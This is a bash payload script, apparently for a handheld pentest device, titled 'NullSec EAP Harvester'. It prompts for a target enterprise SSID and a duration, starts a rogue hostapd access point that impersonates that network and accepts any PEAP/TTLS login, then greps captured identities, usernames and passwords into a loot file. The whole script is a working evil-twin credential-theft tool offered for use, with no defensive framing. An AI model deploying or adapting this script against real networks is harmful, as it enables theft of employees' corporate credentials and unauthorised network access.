#!/bin/bash
# Title: NullSec EAP Harvester
# Author: bad-antics
# Description: Capture enterprise WPA EAP credentials using hostile-portal-toolkit
# Category: nullsec

LOOT_DIR="/mmc/nullsec/captures/eap"
mkdir -p "$LOOT_DIR"

PROMPT "EAP HARVESTER
━━━━━━━━━━━━━━━━━━━━━━━━━
Capture enterprise WiFi
credentials (EAP/PEAP).

Creates fake AP matching
target enterprise SSID.

Press OK to configure."

read -r TARGET_SSID <<< $(EDIT_STRING "Target SSID:" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
[ -z "$TARGET_SSID" ] && TARGET_SSID="CorpWiFi"

DURATION=$(NUMBER_PICKER "Duration (minutes):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac
[ $DURATION -lt 1 ] && DURATION=1
[ $DURATION -gt 60 ] && DURATION=60

resp=$(CONFIRMATION_DIALOG "EAP Harvest Config:
━━━━━━━━━━━━━━━━━━━━━━━━━
SSID: $TARGET_SSID
Duration: ${DURATION}min

Will create fake AP
and capture EAP creds.

START?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

OUTFILE="$LOOT_DIR/eap_$(date +%Y%m%d_%H%M%S).txt"
SPINNER_START "Harvesting EAP..."

# Set up fake AP
hostapd_conf="/tmp/eap_hostapd.conf"
cat > "$hostapd_conf" << HAPD
interface=wlan1
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eap_users
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
HAPD

echo '"*" PEAP,TTLS' > /tmp/eap_users

hostapd "$hostapd_conf" > /tmp/eap_log.txt 2>&1 &
HAPD_PID=$!

sleep $((DURATION * 60))
kill $HAPD_PID 2>/dev/null
SPINNER_STOP

CRED_COUNT=$(grep -c "IDENTITY\|identity" /tmp/eap_log.txt 2>/dev/null || echo "0")
grep -i "identity\|username\|password" /tmp/eap_log.txt > "$OUTFILE" 2>/dev/null

PROMPT "EAP HARVEST COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━
Identities: $CRED_COUNT
SSID: $TARGET_SSID
Duration: ${DURATION}min

Results: $(basename $OUTFILE)"
